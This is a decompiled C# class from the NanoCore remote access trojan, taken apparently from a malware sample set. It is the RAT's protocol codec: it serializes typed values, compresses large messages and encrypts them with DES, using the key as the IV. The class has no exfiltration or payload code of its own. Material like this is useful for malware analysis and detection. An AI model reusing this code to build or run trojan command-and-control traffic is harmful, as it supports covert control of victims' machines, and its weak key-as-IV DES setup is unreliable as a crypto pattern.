// Decompiled with JetBrains decompiler
// Type: Class22
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 3E6578E1-28C0-4BF9-8DBD-C31738BD9814
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Generic-09efb455bb0ce60c3e25c3d2179b7494a69efdee0507cc96a46e1bc838d60041.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Threading;

internal sealed class Class22
{
  private static object object_0 = RuntimeHelpers.GetObjectValue(new object());
  private static BinaryReader binaryReader_0;
  private static MemoryStream memoryStream_0 = new MemoryStream();
  private static BinaryWriter binaryWriter_0;
  private static MemoryStream memoryStream_1;
  private static List<object> list_0;
  private static Dictionary<Type, byte> dictionary_0;
  private static ICryptoTransform icryptoTransform_0;
  private static ICryptoTransform icryptoTransform_1;

  static Class22()
  {
    Class22.binaryReader_0 = new BinaryReader((Stream) Class22.memoryStream_0);
    Class22.memoryStream_1 = new MemoryStream();
    Class22.binaryWriter_0 = new BinaryWriter((Stream) Class22.memoryStream_1);
    Class22.list_0 = new List<object>();
    Class22.dictionary_0 = new Dictionary<Type, byte>();
    Class22.dictionary_0.Add(typeof (bool), (byte) 0);
    Class22.dictionary_0.Add(typeof (byte), (byte) 1);
    Class22.dictionary_0.Add(typeof (byte[]), (byte) 2);
    Class22.dictionary_0.Add(typeof (char), (byte) 3);
    Class22.dictionary_0.Add(typeof (char[]), (byte) 4);
    Class22.dictionary_0.Add(typeof (Decimal), (byte) 5);
    Class22.dictionary_0.Add(typeof (double), (byte) 6);
    Class22.dictionary_0.Add(typeof (int), (byte) 7);
    Class22.dictionary_0.Add(typeof (long), (byte) 8);
    Class22.dictionary_0.Add(typeof (sbyte), (byte) 9);
    Class22.dictionary_0.Add(typeof (short), (byte) 10);
    Class22.dictionary_0.Add(typeof (float), (byte) 11);
    Class22.dictionary_0.Add(typeof (string), (byte) 12);
    Class22.dictionary_0.Add(typeof (uint), (byte) 13);
    Class22.dictionary_0.Add(typeof (ulong), (byte) 14);
    Class22.dictionary_0.Add(typeof (ushort), (byte) 15);
    Class22.dictionary_0.Add(typeof (DateTime), (byte) 16);
    Class22.dictionary_0.Add(typeof (string[]), (byte) 17);
    Class22.dictionary_0.Add(typeof (Guid), (byte) 18);
    Class22.dictionary_0.Add(typeof (Size), (byte) 19);
    Class22.dictionary_0.Add(typeof (Rectangle), (byte) 20);
    Class22.dictionary_0.Add(typeof (Version), (byte) 21);
  }

  public static void smethod_0(byte[] byte_0)
  {
    DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
    cryptoServiceProvider.BlockSize = 64;
    cryptoServiceProvider.Key = byte_0;
    cryptoServiceProvider.IV = byte_0;
    Class22.icryptoTransform_0 = cryptoServiceProvider.CreateEncryptor();
    Class22.icryptoTransform_1 = cryptoServiceProvider.CreateDecryptor();
  }

  public static byte[] smethod_1(object[] object_1)
  {
    Guid guid_0;
    return Class22.smethod_3(true, (byte) 0, (byte) 0, guid_0, object_1);
  }

  public static object[] smethod_2(byte[] byte_0) => Class22.smethod_4(byte_0).object_0;

  public static byte[] smethod_3(
    bool bool_0,
    byte byte_0,
    byte byte_1,
    Guid guid_0,
    object[] object_1)
  {
    lock (Class22.memoryStream_1)
    {
      Class22.binaryWriter_0.Write(bool_0);
      Class22.binaryWriter_0.Write(byte_0);
      Class22.binaryWriter_0.Write(byte_1);
      Guid guid;
      if (guid_0 == guid)
      {
        Class22.binaryWriter_0.Write(false);
      }
      else
      {
        Class22.binaryWriter_0.Write(true);
        Class22.binaryWriter_0.Write(guid_0.ToByteArray());
      }
      if (object_1 != null)
      {
        int num1 = object_1.Length - 1;
        for (int index = 0; index <= num1; ++index)
        {
          Type type = object_1[index].GetType();
          if (type.IsEnum)
            type = Enum.GetUnderlyingType(type);
          byte num2 = Class22.dictionary_0[type];
          Class22.binaryWriter_0.Write(num2);
          switch (num2)
          {
            case 0:
              Class22.binaryWriter_0.Write((bool) object_1[index]);
              break;
            case 1:
              Class22.binaryWriter_0.Write((byte) object_1[index]);
              break;
            case 2:
              Class22.binaryWriter_0.Write(((byte[]) object_1[index]).Length);
              Class22.binaryWriter_0.Write((byte[]) object_1[index]);
              break;
            case 3:
              Class22.binaryWriter_0.Write((char) object_1[index]);
              break;
            case 4:
              Class22.binaryWriter_0.Write(((char[]) object_1[index]).ToString());
              break;
            case 5:
              Class22.binaryWriter_0.Write((Decimal) object_1[index]);
              break;
            case 6:
              Class22.binaryWriter_0.Write((double) object_1[index]);
              break;
            case 7:
              Class22.binaryWriter_0.Write((int) object_1[index]);
              break;
            case 8:
              Class22.binaryWriter_0.Write((long) object_1[index]);
              break;
            case 9:
              Class22.binaryWriter_0.Write((sbyte) object_1[index]);
              break;
            case 10:
              Class22.binaryWriter_0.Write((short) object_1[index]);
              break;
            case 11:
              Class22.binaryWriter_0.Write((float) object_1[index]);
              break;
            case 12:
              Class22.binaryWriter_0.Write((string) object_1[index]);
              break;
            case 13:
              Class22.binaryWriter_0.Write((uint) object_1[index]);
              break;
            case 14:
              Class22.binaryWriter_0.Write((ulong) object_1[index]);
              break;
            case 15:
              Class22.binaryWriter_0.Write((ushort) object_1[index]);
              break;
            case 16:
              Class22.binaryWriter_0.Write(((DateTime) object_1[index]).ToBinary());
              break;
            case 17:
              Class22.binaryWriter_0.Write(((string[]) object_1[index]).Length);
              foreach (string str in (string[]) object_1[index])
                Class22.binaryWriter_0.Write(str);
              break;
            case 18:
              Class22.binaryWriter_0.Write(((Guid) object_1[index]).ToByteArray());
              break;
            case 19:
              Size size = (Size) object_1[index];
              Class22.binaryWriter_0.Write(size.Width);
              Class22.binaryWriter_0.Write(size.Height);
              break;
            case 20:
              Rectangle rectangle = (Rectangle) object_1[index];
              Class22.binaryWriter_0.Write(rectangle.X);
              Class22.binaryWriter_0.Write(rectangle.Y);
              Class22.binaryWriter_0.Write(rectangle.Width);
              Class22.binaryWriter_0.Write(rectangle.Height);
              break;
            case 21:
              Class22.binaryWriter_0.Write(((Version) object_1[index]).ToString());
              break;
          }
        }
      }
      byte[] array1 = Class22.memoryStream_1.ToArray();
      Class22.memoryStream_1.SetLength(0L);
      if (bool_0 && array1.Length >= 860)
      {
        Class22.binaryWriter_0.Write(bool_0);
        Class22.binaryWriter_0.Write(array1.Length - 1);
        DeflateStream deflateStream = new DeflateStream((Stream) Class22.memoryStream_1, CompressionMode.Compress, true);
        deflateStream.Write(array1, 1, array1.Length - 1);
        deflateStream.Close();
        array1 = Class22.memoryStream_1.ToArray();
        Class22.memoryStream_1.SetLength(0L);
      }
      else
        array1[0] = (byte) 0;
      byte[] buffer = Class22.icryptoTransform_0.TransformFinalBlock(array1, 0, array1.Length);
      Class22.binaryWriter_0.Write(buffer);
      byte[] array2 = Class22.memoryStream_1.ToArray();
      Class22.memoryStream_1.SetLength(0L);
      return array2;
    }
  }

  public static GStruct2 smethod_4(byte[] byte_0)
  {
    object object0 = Class22.object_0;
    ObjectFlowControl.CheckForSyncLockOnValueType(object0);
    Monitor.Enter(object0);
    GStruct2 gstruct2_1;
    try
    {
      byte_0 = Class22.icryptoTransform_1.TransformFinalBlock(byte_0, 0, byte_0.Length);
      Class22.memoryStream_0 = new MemoryStream(byte_0);
      Class22.binaryReader_0 = new BinaryReader((Stream) Class22.memoryStream_0);
      if (Class22.binaryReader_0.ReadBoolean())
      {
        int num = Class22.binaryReader_0.ReadInt32();
        DeflateStream deflateStream = new DeflateStream((Stream) Class22.memoryStream_0, CompressionMode.Decompress, false);
        byte[] numArray = new byte[num - 1 + 1];
        deflateStream.Read(numArray, 0, numArray.Length);
        deflateStream.Close();
        Class22.memoryStream_0 = new MemoryStream(numArray);
        Class22.binaryReader_0 = new BinaryReader((Stream) Class22.memoryStream_0);
      }
      GStruct2 gstruct2_2 = new GStruct2();
      gstruct2_2.byte_0 = Class22.binaryReader_0.ReadByte();
      gstruct2_2.byte_1 = Class22.binaryReader_0.ReadByte();
      if (Class22.binaryReader_0.ReadBoolean())
        gstruct2_2.guid_0 = new Guid(Class22.binaryReader_0.ReadBytes(16));
      while (Class22.memoryStream_0.Position != Class22.memoryStream_0.Length)
      {
        switch (Class22.binaryReader_0.ReadByte())
        {
          case 0:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadBoolean());
            continue;
          case 1:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadByte());
            continue;
          case 2:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadBytes(Class22.binaryReader_0.ReadInt32()));
            continue;
          case 3:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadChar());
            continue;
          case 4:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadString().ToCharArray());
            continue;
          case 5:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadDecimal());
            continue;
          case 6:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadDouble());
            continue;
          case 7:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadInt32());
            continue;
          case 8:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadInt64());
            continue;
          case 9:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadSByte());
            continue;
          case 10:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadInt16());
            continue;
          case 11:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadSingle());
            continue;
          case 12:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadString());
            continue;
          case 13:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadUInt32());
            continue;
          case 14:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadUInt64());
            continue;
          case 15:
            Class22.list_0.Add((object) Class22.binaryReader_0.ReadUInt16());
            continue;
          case 16:
            Class22.list_0.Add((object) DateTime.FromBinary(Class22.binaryReader_0.ReadInt64()));
            continue;
          case 17:
            string[] strArray = new string[Class22.binaryReader_0.ReadInt32() - 1 + 1];
            int num1 = strArray.Length - 1;
            for (int index = 0; index <= num1; ++index)
              strArray[index] = Class22.binaryReader_0.ReadString();
            Class22.list_0.Add((object) strArray);
            continue;
          case 18:
            Class22.list_0.Add((object) new Guid(Class22.binaryReader_0.ReadBytes(16)));
            continue;
          case 19:
            Class22.list_0.Add((object) new Size(Class22.binaryReader_0.ReadInt32(), Class22.binaryReader_0.ReadInt32()));
            continue;
          case 20:
            Class22.list_0.Add((object) new Rectangle(Class22.binaryReader_0.ReadInt32(), Class22.binaryReader_0.ReadInt32(), Class22.binaryReader_0.ReadInt32(), Class22.binaryReader_0.ReadInt32()));
            continue;
          case 21:
            Class22.list_0.Add((object) new Version(Class22.binaryReader_0.ReadString()));
            continue;
          default:
            continue;
        }
      }
      gstruct2_2.object_0 = Class22.list_0.ToArray();
      gstruct2_1 = gstruct2_2;
      Class22.list_0.Clear();
      Class22.binaryReader_0.Close();
    }
    finally
    {
      Monitor.Exit(object0);
    }
    return gstruct2_1;
  }
}
